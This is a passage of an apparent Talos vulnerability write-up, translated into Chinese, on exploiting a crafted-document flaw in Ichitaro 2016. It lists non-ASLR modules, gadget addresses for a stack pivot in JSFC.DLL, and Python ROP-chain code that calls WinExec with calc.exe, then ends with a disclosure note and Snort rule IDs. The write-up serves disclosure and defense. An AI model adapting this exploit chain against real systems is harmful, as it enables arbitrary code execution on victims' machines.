**代码执行**
看看崩溃的情况，攻击者控制一个被调用的指针，ecx的内容指向一个攻击者控制的缓冲区。为了实现代码执行，必须进行ROP gadget搜索以寻找stack
pivot。目标是攻击者控制EIP并使堆栈指向攻击者控制的数据。幸运的是，以下模块在进程空间中，不受ASLR影响。
     0：000>！py mona mod -cm aslr = false
    --------------------------------------------------    模块信息：
    --------------------------------------------------    基地址|| 大小| ASLR | 模块名，路径
    --------------------------------------------------    0x5f800000 || 0x000b1000 | False | [JSFC.DLL]
    0x026b0000 || 0x00007000 | False | [jsvdex.dll]
    0x27080000 || 0x000e1000 | False | [JSCTRL.DLL]
    0x3f680000 || 0x00103000 | False | [JCXCALC.DLL]
    0x22150000 || 0x00018000 | False | [JSMACROS.DLL]
    0x003b0000 || 0x00008000 | False | [JSCRT40.dll]
    0x61000000 || 0x0013b000 | False | [JSAPRUN.DLL]
    0x3c7c0000 || 0x01611000 | False | [T26com.DLL]
    0x23c60000 || 0x00024000 | False | [JSDFMT.dll]
    0x03ad0000 || 0x0000b000 | False | [JSTqFTbl.dll]
    0x40030000 || 0x0002c000 | False | [JSFMLE.dll]
    0x21480000 || 0x00082000 | False | [jsgci.dll]
    0x02430000 || 0x00008000 | False | [JSSPLEX.DLL]
    0x43ab 0000 || 0x003af000 | False | [T26STAT.DLL]
    0x217b0000 || 0x0001b000 | False | [JSDOC.dll]
    0x22380000 || 0x0007a000 | False | [JSFORM.OCX]
    0x211a0000 || 0x00049000 | False | [JSTDLIB.DLL]
    0x21e50000 || 0x0002c000 | False | [JSPRMN.dll]
    0x02a80000 || 0x0000e000 | False | [jsvdex2.dll]
    0x277a0000 || 0x00086000 | False | [jsvda.dll]
    0x61200000 || 0x000c6000 | False | [JSHIVW2.dll]
    0x49760000 || 0x00009000 | False | [Jsfolder.dll]
    0x210f0000 || 0x000a1000 | False | [JSPRE.dll]
    0x213e0000 || 0x00022000 | False | [jsmisc32.dll]
不用说，这些模块中有大量的ROP gadget可以用。唯一的问题是攻击者不能直接调用ROP gadget，因为vtable条目是一个指针。在编译ROP
gadget列表之后，需要在所有模块中进行搜索，以查看所有ROP gadget地址是否出现在任何模块中，从而有效地查找找到的ROP
gadget的指针。幸运的是，下面的gadget出现了。
    file:JSFC.DLL
    JSFC.DLL.gadgets.40
    Gadget:0x5f8170bc : sub esp, 4
                        push ebx
                        push esi
                        mov eax, dword ptr [ecx + 0xa0]
                        push edi
                        push ebp
                        mov esi, ecx
                        test eax, eax
                        je 0x5f8170ee
                        push esi
                        call eax
    Simplified
    file:JSFC.DLL
    gadget:0x5f8170bc : mov eax, dword ptr [ecx + 0xa0] ;
                        mov esi, ecx 
                        call eax
此gadget允许指针从攻击者控制的缓冲区取值，并直接调用，允许直接调用gadget。作为来自第一个gadget的副作用，esi和ecx现在指向同一个攻击者控制的缓冲区。以下gadget实现完整stack
pivot。
    JSFC.DLL.gadgets.40
    gadget:0x5f83636e : or bh, bh
                        push esi
                        pop esp
                        mov eax, edi
                        pop edi
                        pop esi
                        pop ebp
                        ret 0x1c
    ]Simplified
    file:JSFC.DLL
    26051:0x5f83636e :  push esi
                        pop esp
                        ret 0x1c
攻击者现在拥有完整的EIP和堆栈控制，允许构建适当的ROP链。
        0：000> r
        eax = 00000000 ebx = ffffffff ecx = 04559138 edx = 0000ffff esi = 62626262 edi = 5f86ecc8
        eip = deadbeef esp = 0455926c ebp = 62626262 iopl = 0 nv up ei ng nz na pe nc
        cs = 001b ss = 0023 ds = 0023 es = 0023 fs = 003b gs = 0000 efl = 00010286
        deadbeef ?? ???
        0：000> dc esp
        0455926c 61616161 61616162 61616163 61616164 aaaabaaacaaadaaa
        0455927c 61616165 61616166 61616167 61616168 eaaafaaagaaahaaa
        0455928c 61616169 6161616a 6161616b 6161616c iaaajaaakaaalaaa
        0455929c 6161616d 6161616e 6161616f 61616170 maaanaaaoaaapaaa
        045592ac 61616171 61616172 61616173 61616174 qaaaraaasaaataaa
        045592bc 61616175 61616176 61616177 61616178 uaaavaaawaaaxaaa
        045592cc 61616179 6261617a 62616162 62616163 yaaazaabbaabcaab
        045592dc 62616164 62616165 62616166 62616167 daabeaabfaabgaab
这时候，攻击者可以通过将一个DLL（S）的导入表导入ntdll中来尝试检索WinExec。从ntdll的一个偏移可以检索到Kernel32。从Kernel32，可以检索到WinExec的偏移量，并且可以执行直接命令。或者…
        $ r2 -q -c'ii〜WinExec'T26COM.DLL
        ordinal = 110 plt = 0x3d46c47c bind = NONE type = FUNC name = KERNEL32.dll_WinExec
    ... WinExec可以由一个已经加载的DLL导入并且攻击者可以简单地使用该地址。编译一个简单的ROP链以将字符串calc.exe放入内存并传递给WinExec函数指针。 
        command = ['calc'，'.exe'，' 0  0  0  0']
        for i,substr in enumerate(command):
            payload += pop_ecx_ret_8                # pop ecx; ret 8
            payload += p32(writable_addr + (i*4))   # Buffer to write the command
            payload += pop_eax_ret                  # pop eax; ret
            payload += p32(0xdeadbeec)              # eaten by ret 8
            payload += p32(0xdeadbeed)              # eaten by ret 8
            payload += substr                       # Current four bytes to write
            payload += write_mem                    # mov dword [ecx], eax; xor eax, eax
        ret
一旦命令字符串在内存中，取值WinExec指针并使用缓冲区调用它想执行的命令。
        ＃Deref WinExec import
       payload += pop_edi_esi_ebx_ret
        payload += p32(winexec-0x64)    # pop edi (offset due to [edi + 0x64])
        payload += p32(0xdeadbeee)      # eaten by pop esi
        payload += p32(0xdeadbeef)      # eaten by pop ebx
        # Call WinExec with buffer pointing to calc.exe
        payload += deref_edi_call       # mov esi, dword [edi + 0x64]; call esi
        payload += p32(writable_addr)   # Buffer with command
        payload += p32(1)               # Display the calc (0 will hide the command output)
下面视频中显示的是在Windows 7运行关于Ichitaro 2016 v0.3.2612的漏洞利用。
**结论**
乍一看报告说，应用程序不检查由特定文件格式提供的长度值是否大于零可能听起来像一个错误，而不是一个漏洞。我们希望这篇文章可以描述一个漏洞开发者如何利用程序逻辑中的一个非常简单的遗漏来创建一个武器化文件，该文件可用于在受害者的系统上执行任意代码。
这些漏洞的性质以及它们对威胁主体的吸引力，就是为什么系统与补丁需要保持更新的最重要原因。这也是为什么Talos要在发布漏洞详细信息之前，开发并发布对发现的每个漏洞进行检测的原因。
Talos致力于在坏人之前发现软件漏洞，并根据我们负责的漏洞披露政策与供应商合作，以确保这样的武器化攻击不会导致系统受损。
Snort规则：40125 – 40126，41703 – 41704